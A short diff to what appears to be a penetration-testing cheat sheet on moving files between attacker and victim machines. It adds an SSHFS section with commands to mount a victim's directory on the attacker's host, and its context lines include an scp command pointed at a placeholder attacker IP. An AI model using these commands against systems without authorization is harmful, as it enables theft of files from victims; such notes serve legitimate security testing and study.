@@ -216,6 +216,16 @@ The attacker has to have SSHd running.
 scp <username>@<Attacker_IP>:<directory>/<filename> 
 ```
 
+# SSHFS
+
+If the victim has SSH, the attacker can mount a directory from the victim to the attacker.
+
+```bash
+sudo apt-get install sshfs
+sudo mkdir /mnt/sshfs
+sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
+```
+
 ## NC
 
 ```bash
